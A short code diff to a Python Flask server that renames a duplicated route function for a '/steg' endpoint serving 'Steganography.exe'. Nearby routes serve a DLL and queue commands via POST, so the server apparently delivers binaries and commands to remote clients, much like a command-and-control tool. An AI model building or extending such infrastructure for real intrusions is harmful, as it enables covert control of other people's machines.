@@ -77,7 +77,7 @@ def handle_lib():
     return send_from_directory(directory="./", filename="libpng16.dll")
 
 @app.route("/steg")
-def handle_lib():
+def handle_steg():
     return send_from_directory(directory="./", filename="Steganography.exe")
 # api endpoint to queue a command
 @app.route("/queueCommand", methods=["POST"])
